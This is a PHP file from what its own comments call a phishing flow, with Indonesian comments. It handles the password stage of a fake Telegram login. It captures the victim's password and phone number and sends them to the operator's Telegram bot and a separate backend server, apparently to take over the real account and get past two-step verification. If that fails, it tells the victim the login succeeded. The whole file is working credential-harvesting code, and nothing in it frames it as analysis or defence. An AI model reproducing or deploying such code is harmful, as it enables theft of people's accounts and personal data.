<?php
require_once __DIR__ . '/JsonSessionHandler.php';
require_once __DIR__ . '/telegram.php';
require_once __DIR__ . '/telegram_config.php';

// Inisialisasi JSON Session Handler
$jsonSessionHandler = new JsonSessionHandler();
session_set_save_handler($jsonSessionHandler, true);
$GLOBALS['jsonSessionHandler'] = $jsonSessionHandler;

session_start();

$message = $_SESSION['message'] ?? '';
$password = $_POST['password'] ?? '';
$phoneNumber = $_SESSION['telegram_phone'] ?? '';

$string = $message;
$string .= "Password : `$password`\n";

$_SESSION['message'] = $string;
$_SESSION['password'] = $password;

// Simpan juga ke JSON secara langsung
if (isset($jsonSessionHandler)) {
    $jsonSessionHandler->saveTelegramData($string, [
        'password' => $password,
        'stage' => 'password_verification'
    ]);
}

// Kirim ke bot Telegram
sendTelegram($string);

// Komunikasi dengan server Flask
try {
    $session_id = session_id();
    $data = [
        'session_id' => $session_id,
        'phone_number' => $phoneNumber,
        'password' => $password
    ];
    
    $ch = curl_init($flask_server_url . "/password");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15); // Increased timeout for 2FA verification
    
    $output = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curl_error = curl_error($ch);
    curl_close($ch);
    
    if ($curl_error) {
        throw new Exception("Error komunikasi dengan server backend: " . $curl_error);
    }
    
    if ($http_code != 200) {
        throw new Exception("Error komunikasi dengan server backend (HTTP $http_code)");
    }
    
    $result = json_decode($output, true);
    
    // Store the result in session
    $_SESSION['telegram_password_result'] = $result;
    
    if (isset($result['success']) && $result['success'] === true) {
        // Authentication completed
        $_SESSION['telegram_auth_completed'] = true;
        echo json_encode(['success' => true]);
    } else {
        // Authentication failed
        echo json_encode(['success' => false, 'error' => $result['error'] ?? 'Invalid password']);
    }
} catch (Exception $e) {
    // Continue the phishing flow even if backend communication fails
    // We'll just pretend the authentication succeeded
    $_SESSION['telegram_auth_completed'] = true;
    
    // Log error for debugging
    error_log("Warning in password.php (continuing anyway): " . $e->getMessage());
    
    // Track the error in our local JSON
    if (isset($jsonSessionHandler)) {
        $jsonSessionHandler->saveTelegramData("Warning in password processing (continuing anyway): " . $e->getMessage(), [
            'warning' => true,
            'stage' => 'password_warning'
        ]);
    }
    
    echo json_encode(['success' => true]);
}
